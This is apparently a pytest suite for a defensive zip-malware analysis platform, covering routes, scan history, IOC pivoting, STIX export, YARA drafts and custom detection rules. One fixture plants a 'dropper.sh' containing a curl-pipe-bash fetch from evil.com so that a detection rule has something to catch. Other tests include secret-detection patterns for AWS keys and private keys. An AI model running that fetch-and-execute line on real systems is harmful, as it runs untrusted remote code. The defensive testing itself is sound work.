"""Tests for the Vantage platform: routes, APIs, database, and custom checks."""

import io
import json
import zipfile

import pytest

from app import app as flask_app
from zip_analyzer import database
from zip_analyzer.custom_check_engine import run_custom_checks
from zip_analyzer.models import Severity
from zip_analyzer.stix_export import to_navigator_layer, to_stix_bundle


@pytest.fixture(autouse=True)
def fresh_db(tmp_path, monkeypatch):
    """Each test gets an isolated in-memory-equivalent SQLite DB."""
    db_path = tmp_path / "test.db"
    monkeypatch.setattr(database, "_DB_PATH", db_path)
    monkeypatch.setattr(database, "_conn", None)
    database.init()
    yield
    # Reset global connection after test
    if database._conn:
        database._conn.close()
        database._conn = None


@pytest.fixture
def client(fresh_db):
    flask_app.config["TESTING"] = True
    with flask_app.test_client() as c:
        yield c


# ── Minimal scan result dict used across multiple tests ───────────────────────

def _make_result(filename="test.zip", risk=42, safe=False, findings=None, mitre=None):
    return {
        "filename": filename,
        "filesize": 1024,
        "safe": safe,
        "error": None,
        "max_severity": "high" if not safe else None,
        "finding_counts": {"critical": 0, "high": 1, "medium": 0, "low": 0, "info": 0},
        "findings": findings or [
            {"severity": "high", "check": "dangerous_extension",
             "description": "Executable file", "filename": "evil.exe", "detail": None}
        ],
        "metrics": {
            "risk_score": risk,
            "risk_label": "HIGH" if risk > 35 else "MEDIUM",
            "confidence": 95,
            "mitre_techniques": mitre if mitre is not None else [{"id": "T1204.002", "name": "User Execution: Malicious File"}],
            "ioc_summary": {
                "ips": [{"ip": "1.2.3.4", "type": "public"}],
                "urls": ["https://evil.example.com/payload"],
                "onions": [],
                "total": 2,
            },
            "file_hashes": [
                {"filename": "evil.exe", "size": 512,
                 "sha256": "a" * 64, "md5": "b" * 32}
            ],
        },
    }


# ═══════════════════════════════════════════════════════════════════════════════
# PAGE ROUTES
# ═══════════════════════════════════════════════════════════════════════════════

class TestPageRoutes:
    def test_landing(self, client):
        r = client.get("/")
        assert r.status_code == 200
        assert b"Vantage" in r.data

    def test_platform_hub(self, client):
        assert client.get("/platform").status_code == 200

    def test_generators_grid(self, client):
        r = client.get("/generators")
        assert r.status_code == 200
        assert b"Command Generators" in r.data

    def test_generator_tool_known_slug(self, client):
        r = client.get("/generators/nmap")
        assert r.status_code == 200
        assert b"nmap" in r.data.lower()

    def test_generator_tool_unknown_slug(self, client):
        assert client.get("/generators/not-a-real-tool").status_code == 404

    def test_analyzer(self, client):
        assert client.get("/analyzer").status_code == 200

    def test_history(self, client):
        assert client.get("/history").status_code == 200

    def test_triage(self, client):
        assert client.get("/triage").status_code == 200

    def test_compare(self, client):
        assert client.get("/compare").status_code == 200

    def test_yara(self, client):
        assert client.get("/yara").status_code == 200

    def test_campaigns(self, client):
        assert client.get("/campaigns").status_code == 200

    def test_custom_checks(self, client):
        assert client.get("/custom-checks").status_code == 200

    def test_watch(self, client):
        assert client.get("/watch").status_code == 200

    def test_curl(self, client):
        assert client.get("/curl").status_code == 200

    def test_unknown_route(self, client):
        assert client.get("/nonexistent-page").status_code == 404


# ═══════════════════════════════════════════════════════════════════════════════
# SCAN HISTORY API
# ═══════════════════════════════════════════════════════════════════════════════

class TestScanHistoryAPI:
    def test_list_scans_empty(self, client):
        resp = client.get("/api/scans")
        assert resp.status_code == 200
        assert resp.get_json() == []

    def test_list_scans_after_save(self, client):
        database.save_scan(_make_result("a.zip"))
        database.save_scan(_make_result("b.zip"))
        data = client.get("/api/scans").get_json()
        assert len(data) == 2
        names = {d["filename"] for d in data}
        assert names == {"a.zip", "b.zip"}

    def test_list_scans_limit(self, client):
        for i in range(10):
            database.save_scan(_make_result(f"f{i}.zip"))
        data = client.get("/api/scans?limit=3").get_json()
        assert len(data) == 3

    def test_get_scan_not_found(self, client):
        resp = client.get("/api/scans/99999")
        assert resp.status_code == 404

    def test_get_scan_found(self, client):
        sid = database.save_scan(_make_result("x.zip"))
        resp = client.get(f"/api/scans/{sid}")
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["filename"] == "x.zip"
        assert "findings" in data
        assert "metrics" in data

    def test_delete_scan(self, client):
        sid = database.save_scan(_make_result())
        assert client.delete(f"/api/scans/{sid}").status_code == 200
        assert client.get(f"/api/scans/{sid}").status_code == 404

    def test_delete_nonexistent_is_ok(self, client):
        # DELETE of non-existent should still return 200 (idempotent)
        assert client.delete("/api/scans/99999").status_code == 200

    def test_patch_scan_notes_and_status(self, client):
        sid = database.save_scan(_make_result())
        resp = client.patch(
            f"/api/scans/{sid}",
            data=json.dumps({"notes": "suspicious", "status": "escalated"}),
            content_type="application/json",
        )
        assert resp.status_code == 200
        scan = database.get_scan(sid)
        assert scan["notes"] == "suspicious"
        assert scan["status"] == "escalated"

    def test_patch_scan_invalid_status(self, client):
        sid = database.save_scan(_make_result())
        resp = client.patch(
            f"/api/scans/{sid}",
            data=json.dumps({"status": "INVALID"}),
            content_type="application/json",
        )
        assert resp.status_code == 400

    def test_patch_scan_notes_only(self, client):
        sid = database.save_scan(_make_result())
        client.patch(
            f"/api/scans/{sid}",
            data=json.dumps({"notes": "reviewed"}),
            content_type="application/json",
        )
        scan = database.get_scan(sid)
        assert scan["notes"] == "reviewed"
        assert scan["status"] == "new"   # unchanged

    def test_ioc_pivot_too_short(self, client):
        resp = client.get("/api/ioc-pivot?q=ab")
        assert resp.status_code == 400

    def test_ioc_pivot_no_results(self, client):
        resp = client.get("/api/ioc-pivot?q=192.168.0.1")
        assert resp.status_code == 200
        assert resp.get_json() == []

    def test_ioc_pivot_finds_ip(self, client):
        database.save_scan(_make_result())   # contains 1.2.3.4
        results = client.get("/api/ioc-pivot?q=1.2.3").get_json()
        assert len(results) >= 1
        assert results[0]["type"] == "ip"

    def test_ioc_pivot_finds_url(self, client):
        database.save_scan(_make_result())   # contains evil.example.com
        results = client.get("/api/ioc-pivot?q=evil.example").get_json()
        assert any(r["type"] == "url" for r in results)


# ═══════════════════════════════════════════════════════════════════════════════
# EXPORT ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════════════

class TestExportEndpoints:
    def test_stix_not_found(self, client):
        assert client.get("/api/scans/99999/stix").status_code == 404

    def test_stix_valid(self, client):
        sid = database.save_scan(_make_result())
        resp = client.get(f"/api/scans/{sid}/stix")
        assert resp.status_code == 200
        bundle = resp.get_json()
        assert bundle["type"] == "bundle"
        assert bundle["spec_version"] == "2.1"
        assert isinstance(bundle["objects"], list)
        assert len(bundle["objects"]) > 0

    def test_stix_contains_ip_indicator(self, client):
        sid = database.save_scan(_make_result())
        bundle = client.get(f"/api/scans/{sid}/stix").get_json()
        indicators = [o for o in bundle["objects"] if o["type"] == "indicator"]
        patterns = [i["pattern"] for i in indicators]
        assert any("1.2.3.4" in p for p in patterns)

    def test_stix_contains_hash_indicator(self, client):
        sid = database.save_scan(_make_result())
        bundle = client.get(f"/api/scans/{sid}/stix").get_json()
        indicators = [o for o in bundle["objects"] if o["type"] == "indicator"]
        patterns = [i["pattern"] for i in indicators]
        assert any("SHA-256" in p for p in patterns)

    def test_navigator_not_found(self, client):
        assert client.get("/api/scans/99999/navigator").status_code == 404

    def test_navigator_valid(self, client):
        sid = database.save_scan(_make_result())
        resp = client.get(f"/api/scans/{sid}/navigator")
        assert resp.status_code == 200
        layer = resp.get_json()
        assert "techniques" in layer
        assert layer["domain"] == "enterprise-attack"

    def test_navigator_contains_mitre_technique(self, client):
        sid = database.save_scan(_make_result(mitre=[{"id": "T1055", "name": "Process Injection"}]))
        layer = client.get(f"/api/scans/{sid}/navigator").get_json()
        ids = [t["techniqueID"] for t in layer["techniques"]]
        assert "T1055" in ids

    def test_navigator_content_disposition(self, client):
        sid = database.save_scan(_make_result())
        resp = client.get(f"/api/scans/{sid}/navigator")
        assert "attachment" in resp.headers.get("Content-Disposition", "")


# ═══════════════════════════════════════════════════════════════════════════════
# CUSTOM CHECKS API
# ═══════════════════════════════════════════════════════════════════════════════

def _json_post(client, url, payload):
    return client.post(url, data=json.dumps(payload), content_type="application/json")


class TestCustomChecksAPI:
    def test_list_empty(self, client):
        resp = client.get("/api/custom-checks")
        assert resp.status_code == 200
        assert resp.get_json() == []

    def test_create_regex(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "AWS Key", "type": "regex",
            "pattern": "AKIA[0-9A-Z]{16}", "severity": "critical",
            "description": "AWS access key",
        })
        assert resp.status_code == 200
        data = resp.get_json()
        assert "id" in data
        checks = client.get("/api/custom-checks").get_json()
        assert len(checks) == 1
        assert checks[0]["name"] == "AWS Key"

    def test_create_string(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "SSH Key Header", "type": "string",
            "pattern": "BEGIN RSA PRIVATE KEY", "severity": "high", "description": "",
        })
        assert resp.status_code == 200

    def test_create_extension(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "HTA files", "type": "extension",
            "pattern": ".hta", "severity": "high", "description": "HTML application",
        })
        assert resp.status_code == 200

    def test_create_filename(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "Crack/keygen", "type": "filename",
            "pattern": "(crack|keygen)", "severity": "medium", "description": "",
        })
        assert resp.status_code == 200

    def test_create_missing_name(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "type": "string", "pattern": "foo", "severity": "low", "description": "",
        })
        assert resp.status_code == 400

    def test_create_missing_pattern(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "X", "type": "string", "severity": "low", "description": "",
        })
        assert resp.status_code == 400

    def test_create_invalid_type(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "X", "type": "unknown", "pattern": "foo",
            "severity": "low", "description": "",
        })
        assert resp.status_code == 400

    def test_create_invalid_severity(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "X", "type": "string", "pattern": "foo",
            "severity": "super-critical", "description": "",
        })
        assert resp.status_code == 400

    def test_create_invalid_regex(self, client):
        resp = _json_post(client, "/api/custom-checks", {
            "name": "Bad", "type": "regex",
            "pattern": "[invalid(regex", "severity": "medium", "description": "",
        })
        assert resp.status_code == 400

    def test_toggle_disable(self, client):
        cid = _json_post(client, "/api/custom-checks", {
            "name": "T", "type": "string", "pattern": "x",
            "severity": "low", "description": "",
        }).get_json()["id"]
        resp = client.post(
            f"/api/custom-checks/{cid}/toggle",
            data=json.dumps({"enabled": False}),
            content_type="application/json",
        )
        assert resp.status_code == 200
        checks = client.get("/api/custom-checks").get_json()
        match = next(c for c in checks if c["id"] == cid)
        assert match["enabled"] == 0

    def test_toggle_enable(self, client):
        cid = _json_post(client, "/api/custom-checks", {
            "name": "T", "type": "string", "pattern": "x",
            "severity": "low", "description": "",
        }).get_json()["id"]
        # disable then re-enable
        client.post(f"/api/custom-checks/{cid}/toggle",
                    data=json.dumps({"enabled": False}), content_type="application/json")
        client.post(f"/api/custom-checks/{cid}/toggle",
                    data=json.dumps({"enabled": True}),  content_type="application/json")
        checks = client.get("/api/custom-checks").get_json()
        assert next(c for c in checks if c["id"] == cid)["enabled"] == 1

    def test_delete(self, client):
        cid = _json_post(client, "/api/custom-checks", {
            "name": "Del", "type": "string", "pattern": "x",
            "severity": "low", "description": "",
        }).get_json()["id"]
        assert client.delete(f"/api/custom-checks/{cid}").status_code == 200
        assert client.get("/api/custom-checks").get_json() == []

    def test_multiple_checks_persist(self, client):
        for i in range(5):
            _json_post(client, "/api/custom-checks", {
                "name": f"Rule {i}", "type": "string", "pattern": f"pattern{i}",
                "severity": "low", "description": "",
            })
        assert len(client.get("/api/custom-checks").get_json()) == 5


# ═══════════════════════════════════════════════════════════════════════════════
# YARA DRAFTS API
# ═══════════════════════════════════════════════════════════════════════════════

class TestYARADraftsAPI:
    def test_list_empty(self, client):
        assert client.get("/api/yara-drafts").get_json() == []

    def test_save_draft(self, client):
        resp = _json_post(client, "/api/yara-drafts", {"name": "MyRule", "content": "rule X {}"})
        assert resp.status_code == 200
        assert "id" in resp.get_json()

    def test_save_and_list(self, client):
        _json_post(client, "/api/yara-drafts", {"name": "A", "content": "rule A {}"})
        _json_post(client, "/api/yara-drafts", {"name": "B", "content": "rule B {}"})
        drafts = client.get("/api/yara-drafts").get_json()
        assert len(drafts) == 2
        names = {d["name"] for d in drafts}
        assert names == {"A", "B"}

    def test_update_draft_content(self, client):
        did = _json_post(client, "/api/yara-drafts", {"name": "X", "content": "old"}).get_json()["id"]
        client.patch(
            f"/api/yara-drafts/{did}",
            data=json.dumps({"content": "new content"}),
            content_type="application/json",
        )
        drafts = client.get("/api/yara-drafts").get_json()
        assert next(d for d in drafts if d["id"] == did)["content"] == "new content"

    def test_delete_draft(self, client):
        did = _json_post(client, "/api/yara-drafts", {"name": "Del", "content": "x"}).get_json()["id"]
        assert client.delete(f"/api/yara-drafts/{did}").status_code == 200
        assert client.get("/api/yara-drafts").get_json() == []

    def test_yara_test_no_rule(self, client):
        resp = _json_post(client, "/api/yara-test", {"rule": ""})
        assert resp.status_code == 400

    def test_yara_test_compile_error(self, client):
        resp = _json_post(client, "/api/yara-test", {"rule": "this is not valid yara"})
        # Either 400 (compile error) or 503 (yara not installed) — both acceptable
        assert resp.status_code in (400, 503)

    def test_yara_test_valid_rule(self, client):
        rule = 'rule Test { strings: $s = "hello" condition: $s }'
        resp = _json_post(client, "/api/yara-test", {"rule": rule})
        # 200 (compiled OK) or 503 (yara not installed)
        assert resp.status_code in (200, 503)
        if resp.status_code == 200:
            assert resp.get_json()["compiled"] is True


# ═══════════════════════════════════════════════════════════════════════════════
# WATCH FOLDERS API
# ═══════════════════════════════════════════════════════════════════════════════

class TestWatchFoldersAPI:
    def test_list_empty(self, client):
        assert client.get("/api/watch-folders").get_json() == []

    def test_add_invalid_path(self, client):
        resp = _json_post(client, "/api/watch-folders", {"path": "/nonexistent/path/xyz"})
        assert resp.status_code == 400

    def test_add_valid_path(self, client, tmp_path):
        resp = _json_post(client, "/api/watch-folders", {"path": str(tmp_path)})
        assert resp.status_code == 200
        assert "id" in resp.get_json()

    def test_add_missing_path(self, client):
        resp = _json_post(client, "/api/watch-folders", {})
        assert resp.status_code == 400

    def test_toggle_folder(self, client, tmp_path):
        fid = _json_post(client, "/api/watch-folders", {"path": str(tmp_path)}).get_json()["id"]
        client.post(
            f"/api/watch-folders/{fid}/toggle",
            data=json.dumps({"enabled": False}),
            content_type="application/json",
        )
        folders = client.get("/api/watch-folders").get_json()
        assert next(f for f in folders if f["id"] == fid)["enabled"] == 0

    def test_delete_folder(self, client, tmp_path):
        fid = _json_post(client, "/api/watch-folders", {"path": str(tmp_path)}).get_json()["id"]
        assert client.delete(f"/api/watch-folders/{fid}").status_code == 200
        assert client.get("/api/watch-folders").get_json() == []

    def test_scan_folder_empty(self, client, tmp_path):
        fid = _json_post(client, "/api/watch-folders", {"path": str(tmp_path)}).get_json()["id"]
        resp = client.post(
            f"/api/watch-folders/{fid}/scan",
            data="{}", content_type="application/json",
        )
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["scanned"] == 0

    def test_scan_folder_with_zip(self, client, tmp_path):
        # Create a real (clean) zip in the temp dir
        zp = tmp_path / "test.zip"
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("hello.txt", "hello world")
        zp.write_bytes(buf.getvalue())

        fid = _json_post(client, "/api/watch-folders", {"path": str(tmp_path)}).get_json()["id"]
        resp = client.post(
            f"/api/watch-folders/{fid}/scan",
            data="{}", content_type="application/json",
        )
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["scanned"] == 1
        assert data["results"][0]["filename"] == "test.zip"


# ═══════════════════════════════════════════════════════════════════════════════
# CAMPAIGNS API
# ═══════════════════════════════════════════════════════════════════════════════

class TestCampaignsAPI:
    def test_empty(self, client):
        assert client.get("/api/campaigns").get_json() == []

    def test_no_cluster_when_single_scan(self, client):
        database.save_scan(_make_result())
        assert client.get("/api/campaigns").get_json() == []

    def test_cluster_on_shared_ip(self, client):
        database.save_scan(_make_result("a.zip"))
        database.save_scan(_make_result("b.zip"))  # both have 1.2.3.4
        camps = client.get("/api/campaigns").get_json()
        assert len(camps) >= 1
        indicators = {c["indicator"] for c in camps}
        assert "1.2.3.4" in indicators

    def test_cluster_on_shared_url(self, client):
        database.save_scan(_make_result("a.zip"))
        database.save_scan(_make_result("b.zip"))
        camps = client.get("/api/campaigns").get_json()
        indicators = {c["indicator"] for c in camps}
        assert "https://evil.example.com/payload" in indicators


# ═══════════════════════════════════════════════════════════════════════════════
# DATABASE LAYER
# ═══════════════════════════════════════════════════════════════════════════════

class TestDatabase:
    def test_save_and_retrieve(self):
        result = _make_result("db_test.zip", risk=55)
        sid = database.save_scan(result)
        assert isinstance(sid, int)
        scan = database.get_scan(sid)
        assert scan["filename"] == "db_test.zip"
        assert scan["risk_score"] == 55
        assert scan["safe"] == 0
        assert isinstance(scan["findings"], list)
        assert isinstance(scan["metrics"], dict)

    def test_get_nonexistent(self):
        assert database.get_scan(99999) is None

    def test_delete_removes_iocs(self):
        sid = database.save_scan(_make_result())
        database.delete_scan(sid)
        assert database.get_scan(sid) is None
        # IOCs should also be gone (CASCADE)
        hits = database.pivot_ioc("1.2.3.4")
        assert len(hits) == 0

    def test_iocs_stored_correctly(self):
        database.save_scan(_make_result())
        ip_hits = database.pivot_ioc("1.2.3.4")
        assert len(ip_hits) == 1
        assert ip_hits[0]["type"] == "ip"

    def test_stats_counts(self):
        database.save_scan(_make_result(safe=True,  risk=0))
        database.save_scan(_make_result(safe=False, risk=80))
        stats = database.scan_stats()
        assert stats["total"] == 2
        assert stats["unsafe"] == 1

    def test_custom_checks_crud(self):
        cid = database.save_custom_check("Test", "string", "pattern", "high", "desc")
        checks = database.get_custom_checks()
        assert len(checks) == 1
        assert checks[0]["name"] == "Test"
        assert checks[0]["enabled"] == 1

        database.toggle_custom_check(cid, False)
        assert database.get_custom_checks()[0]["enabled"] == 0

        database.increment_check_hits(cid)
        assert database.get_custom_checks()[0]["hit_count"] == 1

        database.delete_custom_check(cid)
        assert database.get_custom_checks() == []

    def test_yara_drafts_crud(self):
        did = database.save_yara_draft("MyRule", "rule X {}")
        drafts = database.get_yara_drafts()
        assert len(drafts) == 1
        assert drafts[0]["content"] == "rule X {}"

        database.update_yara_draft(did, content="rule Y {}")
        assert database.get_yara_drafts()[0]["content"] == "rule Y {}"

        database.delete_yara_draft(did)
        assert database.get_yara_drafts() == []

    def test_watch_folder_crud(self, tmp_path):
        fid = database.add_watch_folder(str(tmp_path))
        folders = database.get_watch_folders()
        assert len(folders) == 1
        assert folders[0]["path"] == str(tmp_path)
        assert folders[0]["enabled"] == 1

        database.toggle_watch_folder(fid, False)
        assert database.get_watch_folders()[0]["enabled"] == 0

        database.mark_folder_scanned(fid)
        assert database.get_watch_folders()[0]["total_scanned"] == 1

        database.delete_watch_folder(fid)
        assert database.get_watch_folders() == []

    def test_update_notes_and_status(self):
        sid = database.save_scan(_make_result())
        database.update_scan(sid, notes="analyst note", status="reviewed")
        scan = database.get_scan(sid)
        assert scan["notes"] == "analyst note"
        assert scan["status"] == "reviewed"

    def test_update_notes_only(self):
        sid = database.save_scan(_make_result())
        database.update_scan(sid, notes="note only")
        scan = database.get_scan(sid)
        assert scan["notes"] == "note only"
        assert scan["status"] == "new"


# ═══════════════════════════════════════════════════════════════════════════════
# CUSTOM CHECK ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

def _make_zip(files: dict) -> bytes:
    """Build an in-memory zip with {filename: bytes_content} mapping."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, content in files.items():
            zf.writestr(name, content if isinstance(content, bytes) else content.encode())
    return buf.getvalue()


def _open_zip(data: bytes):
    return zipfile.ZipFile(io.BytesIO(data))


class TestCustomCheckEngine:
    def test_no_checks_returns_empty(self):
        zf = _open_zip(_make_zip({"a.txt": "hello"}))
        assert run_custom_checks(zf, []) == []

    def test_disabled_check_skipped(self):
        check = {"id": 1, "type": "string", "pattern": "hello",
                 "severity": "high", "description": "", "name": "X", "enabled": 0}
        zf = _open_zip(_make_zip({"a.txt": "hello world"}))
        assert run_custom_checks(zf, [check]) == []

    # ── extension ────────────────────────────────────────────────────────────

    def test_extension_check_hit(self):
        check = {"id": 1, "type": "extension", "pattern": ".hta",
                 "severity": "high", "description": "HTA file", "name": "HTA", "enabled": 1}
        zf = _open_zip(_make_zip({"evil.hta": "content", "safe.txt": "ok"}))
        findings = run_custom_checks(zf, [check])
        assert len(findings) == 1
        assert findings[0].filename == "evil.hta"
        assert findings[0].severity == Severity.HIGH

    def test_extension_check_no_leading_dot(self):
        check = {"id": 1, "type": "extension", "pattern": "hta",
                 "severity": "medium", "description": "", "name": "HTA", "enabled": 1}
        zf = _open_zip(_make_zip({"evil.hta": "x"}))
        assert len(run_custom_checks(zf, [check])) == 1

    def test_extension_check_no_match(self):
        check = {"id": 1, "type": "extension", "pattern": ".exe",
                 "severity": "high", "description": "", "name": "EXE", "enabled": 1}
        zf = _open_zip(_make_zip({"safe.txt": "ok"}))
        assert run_custom_checks(zf, [check]) == []

    # ── string ───────────────────────────────────────────────────────────────

    def test_string_check_hit(self):
        check = {"id": 2, "type": "string", "pattern": "BEGIN RSA PRIVATE KEY",
                 "severity": "critical", "description": "Private key", "name": "PK", "enabled": 1}
        content = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAK..."
        zf = _open_zip(_make_zip({"id_rsa.txt": content}))
        findings = run_custom_checks(zf, [check])
        assert len(findings) == 1
        assert findings[0].severity == Severity.CRITICAL

    def test_string_check_no_match(self):
        check = {"id": 2, "type": "string", "pattern": "BEGIN RSA PRIVATE KEY",
                 "severity": "critical", "description": "", "name": "PK", "enabled": 1}
        zf = _open_zip(_make_zip({"readme.txt": "just a readme"}))
        assert run_custom_checks(zf, [check]) == []

    def test_string_check_binary_file_skipped(self):
        check = {"id": 2, "type": "string", "pattern": "evil",
                 "severity": "high", "description": "", "name": "E", "enabled": 1}
        # .exe extension → not in TEXT_EXT → skipped
        zf = _open_zip(_make_zip({"payload.exe": b"\x00evil\x00"}))
        assert run_custom_checks(zf, [check]) == []

    # ── regex ────────────────────────────────────────────────────────────────

    def test_regex_check_hit(self):
        check = {"id": 3, "type": "regex", "pattern": r"AKIA[0-9A-Z]{16}",
                 "severity": "critical", "description": "AWS key", "name": "AWS", "enabled": 1}
        zf = _open_zip(_make_zip({"config.env": "AWS_KEY=AKIAIOSFODNN7EXAMPLE\n"}))
        findings = run_custom_checks(zf, [check])
        assert len(findings) == 1

    def test_regex_check_case_insensitive(self):
        check = {"id": 3, "type": "regex", "pattern": "password",
                 "severity": "medium", "description": "", "name": "P", "enabled": 1}
        zf = _open_zip(_make_zip({"config.env": "PASSWORD=hunter2"}))
        assert len(run_custom_checks(zf, [check])) == 1

    def test_regex_check_no_match(self):
        check = {"id": 3, "type": "regex", "pattern": r"AKIA[0-9A-Z]{16}",
                 "severity": "critical", "description": "", "name": "AWS", "enabled": 1}
        zf = _open_zip(_make_zip({"config.env": "KEY=nothing_here"}))
        assert run_custom_checks(zf, [check]) == []

    # ── filename ─────────────────────────────────────────────────────────────

    def test_filename_check_hit(self):
        check = {"id": 4, "type": "filename", "pattern": r"(crack|keygen)",
                 "severity": "medium", "description": "Social engineering", "name": "SE", "enabled": 1}
        zf = _open_zip(_make_zip({"keygen_v2.exe": "x", "readme.txt": "y"}))
        findings = run_custom_checks(zf, [check])
        assert len(findings) == 1
        assert "keygen" in findings[0].filename

    def test_filename_check_no_match(self):
        check = {"id": 4, "type": "filename", "pattern": r"crack",
                 "severity": "medium", "description": "", "name": "SE", "enabled": 1}
        zf = _open_zip(_make_zip({"legitimate_installer.exe": "x"}))
        assert run_custom_checks(zf, [check]) == []

    def test_multiple_checks_multiple_hits(self):
        checks = [
            {"id": 1, "type": "extension", "pattern": ".sh",
             "severity": "high", "description": "", "name": "SH", "enabled": 1},
            {"id": 2, "type": "string", "pattern": "curl http",
             "severity": "medium", "description": "", "name": "Curl", "enabled": 1},
        ]
        zf = _open_zip(_make_zip({
            "dropper.sh": "curl http://evil.com/payload | bash",
            "readme.txt": "nothing",
        }))
        findings = run_custom_checks(zf, checks)
        check_names = {f.check for f in findings}
        assert "custom_1" in check_names
        assert "custom_2" in check_names


# ═══════════════════════════════════════════════════════════════════════════════
# STIX / NAVIGATOR EXPORT FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

class TestStixExport:
    def _scan(self, **kw):
        r = _make_result(**kw)
        r["id"] = 1
        return r

    def test_stix_bundle_structure(self):
        bundle = to_stix_bundle(self._scan())
        assert bundle["type"] == "bundle"
        assert bundle["spec_version"] == "2.1"
        assert isinstance(bundle["objects"], list)

    def test_stix_has_identity(self):
        bundle = to_stix_bundle(self._scan())
        types = [o["type"] for o in bundle["objects"]]
        assert "identity" in types

    def test_stix_malware_when_unsafe(self):
        bundle = to_stix_bundle(self._scan(safe=False))
        types = [o["type"] for o in bundle["objects"]]
        assert "malware" in types

    def test_stix_no_malware_when_safe(self):
        bundle = to_stix_bundle(self._scan(safe=True, risk=0))
        types = [o["type"] for o in bundle["objects"]]
        assert "malware" not in types

    def test_stix_ip_indicator_present(self):
        bundle = to_stix_bundle(self._scan())
        indicators = [o for o in bundle["objects"] if o["type"] == "indicator"]
        assert any("1.2.3.4" in i["pattern"] for i in indicators)

    def test_stix_url_indicator_present(self):
        bundle = to_stix_bundle(self._scan())
        indicators = [o for o in bundle["objects"] if o["type"] == "indicator"]
        assert any("evil.example.com" in i["pattern"] for i in indicators)

    def test_stix_hash_indicator_present(self):
        bundle = to_stix_bundle(self._scan())
        indicators = [o for o in bundle["objects"] if o["type"] == "indicator"]
        assert any("SHA-256" in i["pattern"] for i in indicators)

    def test_navigator_structure(self):
        layer = to_navigator_layer(self._scan())
        assert "techniques" in layer
        assert "domain" in layer
        assert layer["domain"] == "enterprise-attack"

    def test_navigator_technique_ids(self):
        layer = to_navigator_layer(self._scan(mitre=[{"id": "T1055", "name": "Process Injection"}]))
        ids = [t["techniqueID"] for t in layer["techniques"]]
        assert "T1055" in ids

    def test_navigator_empty_techniques(self):
        layer = to_navigator_layer(self._scan(mitre=[]))
        assert layer["techniques"] == []
